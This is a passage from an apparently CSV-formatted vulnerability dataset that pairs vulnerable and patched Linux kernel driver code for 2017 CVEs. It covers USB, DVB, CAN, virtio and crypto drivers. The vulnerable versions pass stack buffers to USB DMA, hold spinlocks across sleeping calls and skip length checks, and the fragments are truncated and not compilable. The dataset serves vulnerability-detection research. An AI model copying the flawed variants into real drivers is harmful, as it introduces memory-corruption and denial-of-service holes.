 return ret <= 0 ? ret : -EIO;
}

static void cp2112_gpio_set(struct gpio_chip *chip, unsigned offset, int value)
","
exit:
 mutex_unlock(&dev->lock);
 return ret < 0 ? ret : -EIO;
}

static void cp2112_gpio_set(struct gpio_chip *chip, unsigned offset, int value)
"
2017,DoS ,CVE-2017-8071," atomic_t xfer_avail;
 struct gpio_chip gc;
	u8 *in_out_buffer;
 spinlock_t lock;

 struct gpio_desc *desc[8];
 bool gpio_poll;
 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;
 unsigned long flags;
 int ret;

 spin_lock_irqsave(&dev->lock, flags);

	ret = hid_hw_raw_request(hdev, CP2112_GPIO_CONFIG, buf,
				 CP2112_GPIO_CONFIG_LENGTH, HID_FEATURE_REPORT,
	ret = 0;

exit:
 spin_unlock_irqrestore(&dev->lock, flags);
 return ret <= 0 ? ret : -EIO;
}

 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;
 unsigned long flags;
 int ret;

 spin_lock_irqsave(&dev->lock, flags);

	buf[0] = CP2112_GPIO_SET;
	buf[1] = value ? 0xff : 0;
 if (ret < 0)
 hid_err(hdev, ""error setting GPIO values: %d\n"", ret);

 spin_unlock_irqrestore(&dev->lock, flags);
}

static int cp2112_gpio_get_all(struct gpio_chip *chip)
{
 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;
 unsigned long flags;
 int ret;

 spin_lock_irqsave(&dev->lock, flags);

	ret = hid_hw_raw_request(hdev, CP2112_GPIO_GET, buf,
				 CP2112_GPIO_GET_LENGTH, HID_FEATURE_REPORT,
	ret = buf[1];

exit:
 spin_unlock_irqrestore(&dev->lock, flags);

 return ret;
}
 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;
 unsigned long flags;
 int ret;

 spin_lock_irqsave(&dev->lock, flags);

	ret = hid_hw_raw_request(hdev, CP2112_GPIO_CONFIG, buf,
				 CP2112_GPIO_CONFIG_LENGTH, HID_FEATURE_REPORT,
 goto fail;
	}

 spin_unlock_irqrestore(&dev->lock, flags);

 /*
	 * Set gpio value when output direction is already set,
 return 0;

fail:
 spin_unlock_irqrestore(&dev->lock, flags);
 return ret < 0 ? ret : -EIO;
}

 if (!dev->in_out_buffer)
 return -ENOMEM;

 spin_lock_init(&dev->lock);

	ret = hid_parse(hdev);
 if (ret) {
"," atomic_t xfer_avail;
 struct gpio_chip gc;
	u8 *in_out_buffer;
 struct mutex lock;

 struct gpio_desc *desc[8];
 bool gpio_poll;
 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;

 int ret;

 mutex_lock(&dev->lock);

	ret = hid_hw_raw_request(hdev, CP2112_GPIO_CONFIG, buf,
				 CP2112_GPIO_CONFIG_LENGTH, HID_FEATURE_REPORT,
	ret = 0;

exit:
 mutex_unlock(&dev->lock);
 return ret <= 0 ? ret : -EIO;
}

 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;

 int ret;

 mutex_lock(&dev->lock);

	buf[0] = CP2112_GPIO_SET;
	buf[1] = value ? 0xff : 0;
 if (ret < 0)
 hid_err(hdev, ""error setting GPIO values: %d\n"", ret);

 mutex_unlock(&dev->lock);
}

static int cp2112_gpio_get_all(struct gpio_chip *chip)
{
 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;

 int ret;

 mutex_lock(&dev->lock);

	ret = hid_hw_raw_request(hdev, CP2112_GPIO_GET, buf,
				 CP2112_GPIO_GET_LENGTH, HID_FEATURE_REPORT,
	ret = buf[1];

exit:
 mutex_unlock(&dev->lock);

 return ret;
}
 struct cp2112_device *dev = gpiochip_get_data(chip);
 struct hid_device *hdev = dev->hdev;
	u8 *buf = dev->in_out_buffer;

 int ret;

 mutex_lock(&dev->lock);

	ret = hid_hw_raw_request(hdev, CP2112_GPIO_CONFIG, buf,
				 CP2112_GPIO_CONFIG_LENGTH, HID_FEATURE_REPORT,
 goto fail;
	}

 mutex_unlock(&dev->lock);

 /*
	 * Set gpio value when output direction is already set,
 return 0;

fail:
 mutex_unlock(&dev->lock);
 return ret < 0 ? ret : -EIO;
}

 if (!dev->in_out_buffer)
 return -ENOMEM;

 mutex_init(&dev->lock);

	ret = hid_parse(hdev);
 if (ret) {
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8070," struct net_device *netdev;
 struct catc *catc;
	u8 broadcast[ETH_ALEN];
 int i, pktsz, ret;

 if (usb_set_interface(usbdev,
			intf->altsetting->desc.bInterfaceNumber, 1)) {
                catc->irq_buf, 2, catc_irq_done, catc, 1);

 if (!catc->is_f5u011) {



 dev_dbg(dev, ""Checking memory size\n"");

		i = 0x12345678;
 catc_write_mem(catc, 0x7a80, &i, 4);
		i = 0x87654321;	
 catc_write_mem(catc, 0xfa80, &i, 4);
 catc_read_mem(catc, 0x7a80, &i, 4);







 switch (i) {
 case 0x12345678:
 catc_set_reg(catc, TxBufCount, 8);
 catc_set_reg(catc, RxBufCount, 32);
 dev_dbg(dev, ""32k Memory\n"");
 break;
		}



 dev_dbg(dev, ""Getting MAC from SEEROM.\n"");

"," struct net_device *netdev;
 struct catc *catc;
	u8 broadcast[ETH_ALEN];
 int pktsz, ret;

 if (usb_set_interface(usbdev,
			intf->altsetting->desc.bInterfaceNumber, 1)) {
                catc->irq_buf, 2, catc_irq_done, catc, 1);

 if (!catc->is_f5u011) {
		u32 *buf;
 int i;

 dev_dbg(dev, ""Checking memory size\n"");

		buf = kmalloc(4, GFP_KERNEL);
 if (!buf) {
			ret = -ENOMEM;
 goto fail_free;
		}

		*buf = 0x12345678;
 catc_write_mem(catc, 0x7a80, buf, 4);
		*buf = 0x87654321;
 catc_write_mem(catc, 0xfa80, buf, 4);
 catc_read_mem(catc, 0x7a80, buf, 4);

 switch (*buf) {
 case 0x12345678:
 catc_set_reg(catc, TxBufCount, 8);
 catc_set_reg(catc, RxBufCount, 32);
 dev_dbg(dev, ""32k Memory\n"");
 break;
		}

 kfree(buf);

 dev_dbg(dev, ""Getting MAC from SEEROM.\n"");

"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8069,"*/
static int get_registers(rtl8150_t * dev, u16 indx, u16 size, void *data)
{
 return usb_control_msg(dev->udev, usb_rcvctrlpipe(dev->udev, 0),
			       RTL8150_REQ_GET_REGS, RTL8150_REQT_READ,
			       indx, 0, data, size, 500);











}

static int set_registers(rtl8150_t * dev, u16 indx, u16 size, void *data)
{
 return usb_control_msg(dev->udev, usb_sndctrlpipe(dev->udev, 0),
			       RTL8150_REQ_SET_REGS, RTL8150_REQT_WRITE,
			       indx, 0, data, size, 500);









}

static void async_set_reg_cb(struct urb *urb)
","*/
static int get_registers(rtl8150_t * dev, u16 indx, u16 size, void *data)
{
 void *buf;
 int ret;

	buf = kmalloc(size, GFP_NOIO);
 if (!buf)
 return -ENOMEM;

	ret = usb_control_msg(dev->udev, usb_rcvctrlpipe(dev->udev, 0),
			      RTL8150_REQ_GET_REGS, RTL8150_REQT_READ,
			      indx, 0, buf, size, 500);
 if (ret > 0 && ret <= size)
 memcpy(data, buf, ret);
 kfree(buf);
 return ret;
}

static int set_registers(rtl8150_t * dev, u16 indx, u16 size, const void *data)
{
 void *buf;
 int ret;

	buf = kmemdup(data, size, GFP_NOIO);
 if (!buf)
 return -ENOMEM;

	ret = usb_control_msg(dev->udev, usb_sndctrlpipe(dev->udev, 0),
			      RTL8150_REQ_SET_REGS, RTL8150_REQT_WRITE,
			      indx, 0, buf, size, 500);
 kfree(buf);
 return ret;
}

static void async_set_reg_cb(struct urb *urb)
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8068,"
static int get_registers(pegasus_t *pegasus, __u16 indx, __u16 size, void *data)
{

 int ret;





	ret = usb_control_msg(pegasus->usb, usb_rcvctrlpipe(pegasus->usb, 0),
			      PEGASUS_REQ_GET_REGS, PEGASUS_REQT_READ, 0,
			      indx, data, size, 1000);
 if (ret < 0)
 netif_dbg(pegasus, drv, pegasus->net,
 ""%s returned %d\n"", __func__, ret);



 return ret;
}

static int set_registers(pegasus_t *pegasus, __u16 indx, __u16 size, void *data)

{

 int ret;





	ret = usb_control_msg(pegasus->usb, usb_sndctrlpipe(pegasus->usb, 0),
			      PEGASUS_REQ_SET_REGS, PEGASUS_REQT_WRITE, 0,
			      indx, data, size, 100);
 if (ret < 0)
 netif_dbg(pegasus, drv, pegasus->net,
 ""%s returned %d\n"", __func__, ret);

 return ret;
}

static int set_register(pegasus_t *pegasus, __u16 indx, __u8 data)
{

 int ret;





	ret = usb_control_msg(pegasus->usb, usb_sndctrlpipe(pegasus->usb, 0),
			      PEGASUS_REQ_SET_REG, PEGASUS_REQT_WRITE, data,
			      indx, &data, 1, 1000);
 if (ret < 0)
 netif_dbg(pegasus, drv, pegasus->net,
 ""%s returned %d\n"", __func__, ret);

 return ret;
}

","
static int get_registers(pegasus_t *pegasus, __u16 indx, __u16 size, void *data)
{
	u8 *buf;
 int ret;

	buf = kmalloc(size, GFP_NOIO);
 if (!buf)
 return -ENOMEM;

	ret = usb_control_msg(pegasus->usb, usb_rcvctrlpipe(pegasus->usb, 0),
			      PEGASUS_REQ_GET_REGS, PEGASUS_REQT_READ, 0,
			      indx, buf, size, 1000);
 if (ret < 0)
 netif_dbg(pegasus, drv, pegasus->net,
 ""%s returned %d\n"", __func__, ret);
 else if (ret <= size)
 memcpy(data, buf, ret);
 kfree(buf);
 return ret;
}

static int set_registers(pegasus_t *pegasus, __u16 indx, __u16 size,
 const void *data)
{
	u8 *buf;
 int ret;

	buf = kmemdup(data, size, GFP_NOIO);
 if (!buf)
 return -ENOMEM;

	ret = usb_control_msg(pegasus->usb, usb_sndctrlpipe(pegasus->usb, 0),
			      PEGASUS_REQ_SET_REGS, PEGASUS_REQT_WRITE, 0,
			      indx, buf, size, 100);
 if (ret < 0)
 netif_dbg(pegasus, drv, pegasus->net,
 ""%s returned %d\n"", __func__, ret);
 kfree(buf);
 return ret;
}

static int set_register(pegasus_t *pegasus, __u16 indx, __u8 data)
{
	u8 *buf;
 int ret;

	buf = kmemdup(&data, 1, GFP_NOIO);
 if (!buf)
 return -ENOMEM;

	ret = usb_control_msg(pegasus->usb, usb_sndctrlpipe(pegasus->usb, 0),
			      PEGASUS_REQ_SET_REG, PEGASUS_REQT_WRITE, data,
			      indx, buf, 1, 1000);
 if (ret < 0)
 netif_dbg(pegasus, drv, pegasus->net,
 ""%s returned %d\n"", __func__, ret);
 kfree(buf);
 return ret;
}

"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8067,"{
 struct port *port;
 struct scatterlist sg[1];



 if (unlikely(early_put_chars))
 return early_put_chars(vtermno, buf, count);
 if (!port)
 return -EPIPE;

 sg_init_one(sg, buf, count);
 return __send_to_port(port, sg, 1, count, (void *)buf, false);






}

/*
","{
 struct port *port;
 struct scatterlist sg[1];
 void *data;
 int ret;

 if (unlikely(early_put_chars))
 return early_put_chars(vtermno, buf, count);
 if (!port)
 return -EPIPE;

	data = kmemdup(buf, count, GFP_ATOMIC);
 if (!data)
 return -ENOMEM;

 sg_init_one(sg, data, count);
	ret = __send_to_port(port, sg, 1, count, data, false);
 kfree(data);
 return ret;
}

/*
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8066," struct gs_usb *dev;
 int rc = -ENOMEM;
 unsigned int icount, i;
 struct gs_host_config hconf = {
		.byte_order = 0x0000beef,
	};
 struct gs_device_config dconf;





 /* send host config */
	rc = usb_control_msg(interface_to_usbdev(intf),
			     USB_DIR_OUT|USB_TYPE_VENDOR|USB_RECIP_INTERFACE,
 1,
			     intf->altsetting[0].desc.bInterfaceNumber,
 &hconf,
 sizeof(hconf),
 1000);



 if (rc < 0) {
 dev_err(&intf->dev, ""Couldn't send data format (err=%d)\n"",
			rc);
 return rc;
	}





 /* read device config */
	rc = usb_control_msg(interface_to_usbdev(intf),
 usb_rcvctrlpipe(interface_to_usbdev(intf), 0),
			     GS_USB_BREQ_DEVICE_CONFIG,
			     USB_DIR_IN|USB_TYPE_VENDOR|USB_RECIP_INTERFACE,
 1,
			     intf->altsetting[0].desc.bInterfaceNumber,
 &dconf,
 sizeof(dconf),
 1000);
 if (rc < 0) {
 dev_err(&intf->dev, ""Couldn't get device config: (err=%d)\n"",
			rc);

 return rc;
	}

	icount = dconf.icount + 1;
 dev_info(&intf->dev, ""Configuring for %d interfaces\n"", icount);

 if (icount > GS_MAX_INTF) {
 dev_err(&intf->dev,
 ""Driver cannot handle more that %d CAN interfaces\n"",
			GS_MAX_INTF);

 return -EINVAL;
	}

	dev = kzalloc(sizeof(*dev), GFP_KERNEL);
 if (!dev)

 return -ENOMEM;


 init_usb_anchor(&dev->rx_submitted);

 atomic_set(&dev->active_channels, 0);
	dev->udev = interface_to_usbdev(intf);

 for (i = 0; i < icount; i++) {
		dev->canch[i] = gs_make_candev(i, intf, &dconf);
 if (IS_ERR_OR_NULL(dev->canch[i])) {
 /* save error code to return later */
			rc = PTR_ERR(dev->canch[i]);
 gs_destroy_candev(dev->canch[i]);

 usb_kill_anchored_urbs(&dev->rx_submitted);

 kfree(dev);
 return rc;
		}
		dev->canch[i]->parent = dev;
	}



 return 0;
}

"," struct gs_usb *dev;
 int rc = -ENOMEM;
 unsigned int icount, i;
 struct gs_host_config *hconf;
 struct gs_device_config *dconf;

	hconf = kmalloc(sizeof(*hconf), GFP_KERNEL);
 if (!hconf)
 return -ENOMEM;

	hconf->byte_order = 0x0000beef;

 /* send host config */
	rc = usb_control_msg(interface_to_usbdev(intf),
			     USB_DIR_OUT|USB_TYPE_VENDOR|USB_RECIP_INTERFACE,
 1,
			     intf->altsetting[0].desc.bInterfaceNumber,
			     hconf,
 sizeof(*hconf),
 1000);

 kfree(hconf);

 if (rc < 0) {
 dev_err(&intf->dev, ""Couldn't send data format (err=%d)\n"",
			rc);
 return rc;
	}

	dconf = kmalloc(sizeof(*dconf), GFP_KERNEL);
 if (!dconf)
 return -ENOMEM;

 /* read device config */
	rc = usb_control_msg(interface_to_usbdev(intf),
 usb_rcvctrlpipe(interface_to_usbdev(intf), 0),
			     GS_USB_BREQ_DEVICE_CONFIG,
			     USB_DIR_IN|USB_TYPE_VENDOR|USB_RECIP_INTERFACE,
 1,
			     intf->altsetting[0].desc.bInterfaceNumber,
			     dconf,
 sizeof(*dconf),
 1000);
 if (rc < 0) {
 dev_err(&intf->dev, ""Couldn't get device config: (err=%d)\n"",
			rc);
 kfree(dconf);
 return rc;
	}

	icount = dconf->icount + 1;
 dev_info(&intf->dev, ""Configuring for %d interfaces\n"", icount);

 if (icount > GS_MAX_INTF) {
 dev_err(&intf->dev,
 ""Driver cannot handle more that %d CAN interfaces\n"",
			GS_MAX_INTF);
 kfree(dconf);
 return -EINVAL;
	}

	dev = kzalloc(sizeof(*dev), GFP_KERNEL);
 if (!dev) {
 kfree(dconf);
 return -ENOMEM;
	}

 init_usb_anchor(&dev->rx_submitted);

 atomic_set(&dev->active_channels, 0);
	dev->udev = interface_to_usbdev(intf);

 for (i = 0; i < icount; i++) {
		dev->canch[i] = gs_make_candev(i, intf, dconf);
 if (IS_ERR_OR_NULL(dev->canch[i])) {
 /* save error code to return later */
			rc = PTR_ERR(dev->canch[i]);
 gs_destroy_candev(dev->canch[i]);

 usb_kill_anchored_urbs(&dev->rx_submitted);
 kfree(dconf);
 kfree(dev);
 return rc;
		}
		dev->canch[i]->parent = dev;
	}

 kfree(dconf);

 return 0;
}

"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8065,"
struct crypto_ccm_req_priv_ctx {
	u8 odata[16];

	u8 auth_tag[16];
	u32 flags;
 struct scatterlist src[3];
 AHASH_REQUEST_ON_STACK(ahreq, ctx->mac);
 unsigned int assoclen = req->assoclen;
 struct scatterlist sg[3];
	u8 odata[16];
	u8 idata[16];
 int ilen, err;

 /* format control data for input */
","
struct crypto_ccm_req_priv_ctx {
	u8 odata[16];
	u8 idata[16];
	u8 auth_tag[16];
	u32 flags;
 struct scatterlist src[3];
 AHASH_REQUEST_ON_STACK(ahreq, ctx->mac);
 unsigned int assoclen = req->assoclen;
 struct scatterlist sg[3];
	u8 *odata = pctx->odata;
	u8 *idata = pctx->idata;
 int ilen, err;

 /* format control data for input */
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8064,"void dvb_usbv2_disconnect(struct usb_interface *intf)
{
 struct dvb_usb_device *d = usb_get_intfdata(intf);
 const char *name = d->name;
 struct device dev = d->udev->dev;

 dev_dbg(&d->udev->dev, ""%s: bInterfaceNumber=%d\n"", __func__,
			intf->cur_altsetting->desc.bInterfaceNumber);

 dvb_usbv2_exit(d);

 dev_info(&dev, ""%s: '%s' successfully deinitialized and disconnected\n"",
			KBUILD_MODNAME, name);

}
EXPORT_SYMBOL(dvb_usbv2_disconnect);

","void dvb_usbv2_disconnect(struct usb_interface *intf)
{
 struct dvb_usb_device *d = usb_get_intfdata(intf);
 const char *devname = kstrdup(dev_name(&d->udev->dev), GFP_KERNEL);
 const char *drvname = d->name;

 dev_dbg(&d->udev->dev, ""%s: bInterfaceNumber=%d\n"", __func__,
			intf->cur_altsetting->desc.bInterfaceNumber);

 dvb_usbv2_exit(d);

 pr_info(""%s: '%s:%s' successfully deinitialized and disconnected\n"",
		KBUILD_MODNAME, drvname, devname);
 kfree(devname);
}
EXPORT_SYMBOL(dvb_usbv2_disconnect);

"
2017,DoS Overflow ,CVE-2017-8063,"			  u8 cmd, u8 *wbuf, int wlen, u8 *rbuf, int rlen)
{
 struct cxusb_state *st = d->priv;
 int ret, wo;

 if (1 + wlen > MAX_XFER_SIZE) {
 warn(""i2c wr: len=%d is too big!\n"", wlen);
 return -EOPNOTSUPP;
	}

	wo = (rbuf == NULL || rlen == 0); /* write-only */




 mutex_lock(&d->data_mutex);
	st->data[0] = cmd;
 memcpy(&st->data[1], wbuf, wlen);
 if (wo)
		ret = dvb_usb_generic_write(d, st->data, 1 + wlen);
 else
		ret = dvb_usb_generic_rw(d, st->data, 1 + wlen,
					 rbuf, rlen, 0);

 mutex_unlock(&d->data_mutex);
 return ret;
","			  u8 cmd, u8 *wbuf, int wlen, u8 *rbuf, int rlen)
{
 struct cxusb_state *st = d->priv;
 int ret;

 if (1 + wlen > MAX_XFER_SIZE) {
 warn(""i2c wr: len=%d is too big!\n"", wlen);
 return -EOPNOTSUPP;
	}

 if (rlen > MAX_XFER_SIZE) {
 warn(""i2c rd: len=%d is too big!\n"", rlen);
 return -EOPNOTSUPP;
	}

 mutex_lock(&d->data_mutex);
	st->data[0] = cmd;
 memcpy(&st->data[1], wbuf, wlen);
	ret = dvb_usb_generic_rw(d, st->data, 1 + wlen, st->data, rlen, 0);
 if (!ret && rbuf && rlen)
 memcpy(rbuf, st->data, rlen);



 mutex_unlock(&d->data_mutex);
 return ret;
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8062,"struct dw2102_state {
	u8 initialized;
	u8 last_lock;

 struct i2c_client *i2c_client_demod;
 struct i2c_client *i2c_client_tuner;

 int num)
{
 struct dvb_usb_device *d = i2c_get_adapdata(adap);
 u8 obuf[0x40], ibuf[0x40];

 if (!d)
 return -ENODEV;



 if (mutex_lock_interruptible(&d->i2c_mutex) < 0)
 return -EAGAIN;





 switch (num) {
 case 1:
 switch (msg[0].addr) {
 case SU3000_STREAM_CTRL:
			obuf[0] = msg[0].buf[0] + 0x36;
			obuf[1] = 3;
			obuf[2] = 0;
 if (dvb_usb_generic_rw(d, obuf, 3, ibuf, 0, 0) < 0)

 err(""i2c transfer failed."");
 break;
 case DW2102_RC_QUERY:
			obuf[0] = 0x10;
 if (dvb_usb_generic_rw(d, obuf, 1, ibuf, 2, 0) < 0)

 err(""i2c transfer failed."");
			msg[0].buf[1] = ibuf[0];
			msg[0].buf[0] = ibuf[1];
 break;
 default:
 /* always i2c write*/
 obuf[0] = 0x08;
 obuf[1] = msg[0].addr;
 obuf[2] = msg[0].len;

 memcpy(&obuf[3], msg[0].buf, msg[0].len);

 if (dvb_usb_generic_rw(d, obuf, msg[0].len + 3,
 ibuf, 1, 0) < 0)
 err(""i2c transfer failed."");

		}
 break;
 case 2:
 /* always i2c read */
 obuf[0] = 0x09;
 obuf[1] = msg[0].len;
 obuf[2] = msg[1].len;
 obuf[3] = msg[0].addr;
 memcpy(&obuf[4], msg[0].buf, msg[0].len);

 if (dvb_usb_generic_rw(d, obuf, msg[0].len + 4,
 ibuf, msg[1].len + 1, 0) < 0)
 err(""i2c transfer failed."");

 memcpy(msg[1].buf, &ibuf[1], msg[1].len);
 break;
 default:
 warn(""more than 2 i2c messages at a time is not handled yet."");
 break;
	}

 mutex_unlock(&d->i2c_mutex);
 return num;
}
static int su3000_power_ctrl(struct dvb_usb_device *d, int i)
{
 struct dw2102_state *state = (struct dw2102_state *)d->priv;
 u8 obuf[] = {0xde, 0};

 info(""%s: %d, initialized %d"", __func__, i, state->initialized);

 if (i && !state->initialized) {





		state->initialized = 1;
 /* reset board */
 return dvb_usb_generic_rw(d, obuf, 2, NULL, 0, 0);

	}

 return 0;
}

static int su3000_read_mac_address(struct dvb_usb_device *d, u8 mac[6])
 return 0;
}

static int su3000_frontend_attach(struct dvb_usb_adapter *d)
{
	u8 obuf[3] = { 0xe, 0x80, 0 };
	u8 ibuf[] = { 0 };







 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0xe;
 obuf[1] = 0x02;
 obuf[2] = 1;

 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");
 msleep(300);

 obuf[0] = 0xe;
 obuf[1] = 0x83;
 obuf[2] = 0;

 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0xe;
 obuf[1] = 0x83;
 obuf[2] = 1;

 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0x51;

 if (dvb_usb_generic_rw(d->dev, obuf, 1, ibuf, 1, 0) < 0)
 err(""command 0x51 transfer failed."");

	d->fe_adap[0].fe = dvb_attach(ds3000_attach, &su3000_ds3000_config,
					&d->dev->i2c_adap);
 if (d->fe_adap[0].fe == NULL)


 return -EIO;

 if (dvb_attach(ts2020_attach, d->fe_adap[0].fe,
				&dw2104_ts2020_config,
				&d->dev->i2c_adap)) {
 info(""Attached DS3000/TS2020!"");
 return 0;
	}
 return -EIO;
}

static int t220_frontend_attach(struct dvb_usb_adapter *d)
{
	u8 obuf[3] = { 0xe, 0x87, 0 };
	u8 ibuf[] = { 0 };



 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)




 err(""command 0x0e transfer failed."");

 obuf[0] = 0xe;
 obuf[1] = 0x86;
 obuf[2] = 1;

 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0xe;
 obuf[1] = 0x80;
 obuf[2] = 0;

 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 msleep(50);

 obuf[0] = 0xe;
 obuf[1] = 0x80;
 obuf[2] = 1;

 if (dvb_usb_generic_rw(d->dev, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0x51;

 if (dvb_usb_generic_rw(d->dev, obuf, 1, ibuf, 1, 0) < 0)
 err(""command 0x51 transfer failed."");

	d->fe_adap[0].fe = dvb_attach(cxd2820r_attach, &cxd2820r_config,
					&d->dev->i2c_adap, NULL);
 if (d->fe_adap[0].fe != NULL) {
 if (dvb_attach(tda18271_attach, d->fe_adap[0].fe, 0x60,
					&d->dev->i2c_adap, &tda18271_config)) {


 info(""Attached TDA18271HD/CXD2820R!"");
 return 0;
		}
 return -EIO;
}

static int m88rs2000_frontend_attach(struct dvb_usb_adapter *d)
{
	u8 obuf[] = { 0x51 };
	u8 ibuf[] = { 0 };



 if (dvb_usb_generic_rw(d->dev, obuf, 1, ibuf, 1, 0) < 0)


 err(""command 0x51 transfer failed."");

	d->fe_adap[0].fe = dvb_attach(m88rs2000_attach, &s421_m88rs2000_config,
					&d->dev->i2c_adap);

 if (d->fe_adap[0].fe == NULL)




 return -EIO;

 if (dvb_attach(ts2020_attach, d->fe_adap[0].fe,
				&dw2104_ts2020_config,
				&d->dev->i2c_adap)) {
 info(""Attached RS2000/TS2020!"");
 return 0;
	}
{
 struct dvb_usb_device *d = adap->dev;
 struct dw2102_state *state = d->priv;
	u8 obuf[3] = { 0xe, 0x80, 0 };
	u8 ibuf[] = { 0 };
 struct i2c_adapter *i2c_adapter;
 struct i2c_client *client;
 struct i2c_board_info board_info;
 struct m88ds3103_platform_data m88ds3103_pdata = {};
 struct ts2020_config ts2020_config = {};

 if (dvb_usb_generic_rw(d, obuf, 3, ibuf, 1, 0) < 0)






 err(""command 0x0e transfer failed."");

 obuf[0] = 0xe;
 obuf[1] = 0x02;
 obuf[2] = 1;

 if (dvb_usb_generic_rw(d, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");
 msleep(300);

 obuf[0] = 0xe;
 obuf[1] = 0x83;
 obuf[2] = 0;

 if (dvb_usb_generic_rw(d, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0xe;
 obuf[1] = 0x83;
 obuf[2] = 1;

 if (dvb_usb_generic_rw(d, obuf, 3, ibuf, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 obuf[0] = 0x51;

 if (dvb_usb_generic_rw(d, obuf, 1, ibuf, 1, 0) < 0)
 err(""command 0x51 transfer failed."");



 /* attach demod */
	m88ds3103_pdata.clk = 27000000;
	m88ds3103_pdata.i2c_wr_max = 33;
","struct dw2102_state {
	u8 initialized;
	u8 last_lock;
	u8 data[MAX_XFER_SIZE + 4];
 struct i2c_client *i2c_client_demod;
 struct i2c_client *i2c_client_tuner;

 int num)
{
 struct dvb_usb_device *d = i2c_get_adapdata(adap);
 struct dw2102_state *state;

 if (!d)
 return -ENODEV;

	state = d->priv;

 if (mutex_lock_interruptible(&d->i2c_mutex) < 0)
 return -EAGAIN;
 if (mutex_lock_interruptible(&d->data_mutex) < 0) {
 mutex_unlock(&d->i2c_mutex);
 return -EAGAIN;
	}

 switch (num) {
 case 1:
 switch (msg[0].addr) {
 case SU3000_STREAM_CTRL:
			state->data[0] = msg[0].buf[0] + 0x36;
			state->data[1] = 3;
			state->data[2] = 0;
 if (dvb_usb_generic_rw(d, state->data, 3,
					state->data, 0, 0) < 0)
 err(""i2c transfer failed."");
 break;
 case DW2102_RC_QUERY:
			state->data[0] = 0x10;
 if (dvb_usb_generic_rw(d, state->data, 1,
					state->data, 2, 0) < 0)
 err(""i2c transfer failed."");
			msg[0].buf[1] = state->data[0];
			msg[0].buf[0] = state->data[1];
 break;
 default:
 /* always i2c write*/
 state->data[0] = 0x08;
 state->data[1] = msg[0].addr;
 state->data[2] = msg[0].len;

 memcpy(&state->data[3], msg[0].buf, msg[0].len);

 if (dvb_usb_generic_rw(d, state->data, msg[0].len + 3,
 state->data, 1, 0) < 0)
 err(""i2c transfer failed."");

		}
 break;
 case 2:
 /* always i2c read */
 state->data[0] = 0x09;
 state->data[1] = msg[0].len;
 state->data[2] = msg[1].len;
 state->data[3] = msg[0].addr;
 memcpy(&state->data[4], msg[0].buf, msg[0].len);

 if (dvb_usb_generic_rw(d, state->data, msg[0].len + 4,
 state->data, msg[1].len + 1, 0) < 0)
 err(""i2c transfer failed."");

 memcpy(msg[1].buf, &state->data[1], msg[1].len);
 break;
 default:
 warn(""more than 2 i2c messages at a time is not handled yet."");
 break;
	}
 mutex_unlock(&d->data_mutex);
 mutex_unlock(&d->i2c_mutex);
 return num;
}
static int su3000_power_ctrl(struct dvb_usb_device *d, int i)
{
 struct dw2102_state *state = (struct dw2102_state *)d->priv;
 int ret = 0;

 info(""%s: %d, initialized %d"", __func__, i, state->initialized);

 if (i && !state->initialized) {
 mutex_lock(&d->data_mutex);

		state->data[0] = 0xde;
		state->data[1] = 0;

		state->initialized = 1;
 /* reset board */
		ret = dvb_usb_generic_rw(d, state->data, 2, NULL, 0, 0);
 mutex_unlock(&d->data_mutex);
	}

 return ret;
}

static int su3000_read_mac_address(struct dvb_usb_device *d, u8 mac[6])
 return 0;
}

static int su3000_frontend_attach(struct dvb_usb_adapter *adap)
{
 struct dvb_usb_device *d = adap->dev;
 struct dw2102_state *state = d->priv;

 mutex_lock(&d->data_mutex);

	state->data[0] = 0xe;
	state->data[1] = 0x80;
	state->data[2] = 0;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0xe;
 state->data[1] = 0x02;
 state->data[2] = 1;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");
 msleep(300);

 state->data[0] = 0xe;
 state->data[1] = 0x83;
 state->data[2] = 0;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0xe;
